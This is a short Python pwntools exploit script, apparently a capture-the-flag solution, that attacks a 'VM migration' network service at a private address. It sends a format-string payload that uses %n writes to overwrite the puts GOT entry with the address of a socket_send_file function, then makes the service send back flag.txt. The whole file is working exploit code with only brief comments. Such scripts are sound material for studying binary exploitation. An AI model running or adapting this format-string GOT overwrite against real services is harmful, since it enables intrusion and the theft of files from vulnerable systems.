from time import sleep
from pwn import *

IP = '192.168.59.103'
PORT = 8888

r = remote(IP, PORT)

puts_got = 0x0804B030
socket_send_file = 0x0804893C
socket_send_file_bytes = [ord(c) for c in p32(socket_send_file)]

r.sendlineafter('Select an option:', '1')
r.sendlineafter('Enter the name of the VM to migrate',
    # Addresses of the bytes of the puts GOT entry
    p32(puts_got + 0) +
    p32(puts_got + 1) +
    p32(puts_got + 2) +
    p32(puts_got + 3) +
    
    # Number of printed bytes so far: 0x18
    # Setting the puts pointer to socket_send_file with the wraparound technique:
    '%6$0' + str((socket_send_file_bytes[0] - 0x18                      + 0x100) % 0x100) + 'd' + '%9$n' +
    '%6$0' + str((socket_send_file_bytes[1] - socket_send_file_bytes[0] + 0x100) % 0x100) + 'd' + '%10$n' +
    '%6$0' + str((socket_send_file_bytes[2] - socket_send_file_bytes[1] + 0x100) % 0x100) + 'd' + '%11$n' +
    '%6$0' + str((socket_send_file_bytes[3] - socket_send_file_bytes[2] + 0x100) % 0x100) + 'd' + '%12$n'
)
r.sendlineafter('Enter the destination IP and port (Format: <ip>:<port>)', '1.1.1.1:10')

r.sendlineafter('Select an option:', '1')
r.sendlineafter('Enter the name of the VM to migrate', 'flag.txt\n\x00');
r.sendlineafter('Enter the destination IP and port (Format: <ip>:<port>)\n', '1.1.1.1:10')
print r.recvuntil('Successfully migrated VM')[:-len('Successfully migrated VM')]

r.sendlineafter('Select an option:', '2')
r.close()
